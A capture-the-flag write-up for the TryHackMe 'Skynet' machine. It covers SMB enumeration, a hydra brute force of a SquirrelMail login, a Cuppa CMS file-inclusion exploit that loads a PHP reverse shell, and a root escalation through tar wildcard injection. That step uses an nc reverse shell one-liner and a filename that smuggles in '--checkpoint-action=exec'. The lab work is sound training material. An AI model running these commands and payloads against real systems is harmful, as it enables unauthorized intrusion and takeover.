# Skynet


## Recon

_Open Ports_

```
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

Since samba is open we will enum using *enum4linux* and *smbmap*

The first one to finish is *smbmap* and we find interesting stuff on there

```
▶ smbmap -H 10.10.238.139 | tee smbmap.log
[+] Guest session       IP: 10.10.238.139:445   Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))

```


Meanwhile we start a *gobuster* scan and inspect what *smbmap* gave us

We use *smbclient* and find some files

```
▶ smbclient //10.10.238.139/anonymous     
Enter WORKGROUP\krane's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 18 00:41:20 2019
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019
  books                               D        0  Wed Sep 18 00:40:06 2019

                9204224 blocks of size 1024. 5371764 blocks available
smb: \> 

```

Let's inspect the donwloaded files

```
tryhackme/skynet/downloaded                                                                                              
▶ ls
attention.txt  log1.txt  log2.txt  log3.txt

```

This gives us a hint as to how passwords may be changed to default

```
▶ cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

By checking out *log.txt* files we see this is a password list handed to us for bruteforcing logins maybe

```
▶ cat log1.txt
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
[...]
```

Now that we have this, and the other *disks* from the *smbmap* scan where *NO ACCESS* it's time to check *gobuster* and *nmap again*

We will first go for *gobuster*

```
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/admin (Status: 301)
/config (Status: 301)
/css (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
/squirrelmail (Status: 301)

```

Since all the other paths are *forbidden* we check */squirrelmail*


Before we bruteforce let's check for the version *1.4.23* and see if there are any exploits

```
▶ searchsploit squirrelmail 1.4           
```

We don't find anything interesting there when it comes to remote access, but there's a very interesting local file inclusion that we can do *after* we login.

Time to Bruteforce


## Exploiting

Running *hydra* with some default users and the password list we found on the anonymous folder.

```
hydra -L http_default_users.txt -P passwords.txt 10.10.238.139 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:ERROR"
```

While we wait for *hydra* to finish, we will inspect the *nmap* results again

```
[STATUS] 77.00 tries/min, 77 tries in 00:01h, 295 to do in 00:04h, 16 active

```

Since it has port 22 open we will try to bruteforce it as well.

```
▶ hydra -L ssh-user.txt -P passwords.txt 10.10.238.139 -t 4 ssh -I
```

As the ssh bruteforce started, the web login failed to find any valid passwords with the users i supplied

While this runs we will get back to reading the *enum4linux* log

After ssh brutefoce and the http bruteforce failed, we try to bruteforce samba for the user miledyson

The smb bruteforce also failed we need another approach

After taking a second look at *hydra* and changing the error message to "*Unknown user or password incorrect.*" we rerun the command and get the password

```
[80][http-post-form] host: 10.10.238.139   login: milesdyson   password: cyborg007haloterminator
```

We find an interesting message on inbox

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`

```

And by looking in the header we see that this mail is sent to miledyson (or by knowing we logged as him on the mail server)

let's test the password.


We need to add an escape character before *`*

```
▶ smbmap -H 10.10.238.139 -u milesdyson -p ")s{A&2Z=F^n_E.B\`"

[+] IP: 10.10.238.139:445       Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              READ ONLY       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))

```

Now that we have more access we can go and check out milesdyson

There was only 1 interesting file called "*important*"

```
▶ cat important.txt             

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

```

After we reach that page we are met with a photo and some text, but nothing too interesting

We download the photo using *curl* and run *steghide* on it but nothing

Let's enumerate this page with *gobuster*

```
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/administrator (Status: 301)
/index.html (Status: 200)
```

The administrator login is on "*Cuppa CMS*" let's look for exploits

```
▶ searchsploit cuppa cms       

Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                   
```
It's just one exploit so i expect to be a smooth sailing from here on


```
http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
```

Time to include files. *BEWARE* we don't want the file to execute on our system so we need to use 

```
python3 -m http.server
```

Okay now we have access to the server

```
▶ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.238.139 - - [09/Jul/2020 11:25:44] "GET /php-reverse-shell.php HTTP/1.0" 200 -


$ python -c "import pty;pty.spawn('/bin/bash')
> "
www-data@skynet:/$ id  
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Let's get the flags and then priv-esc

## Privilege Escalation

We need to transport linPEAS

We find that there's an SUID priv-esc on the backup.sh file that's using TAR to archive, we can exploit that

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.13.150 6942 > /tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"  
```

And now we are *root*

```
▶ nc -nlvp 6942 
listening on [any] 6942 ...
connect to [10.11.13.150] from (UNKNOWN) [10.10.238.139] 48076
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# 
```
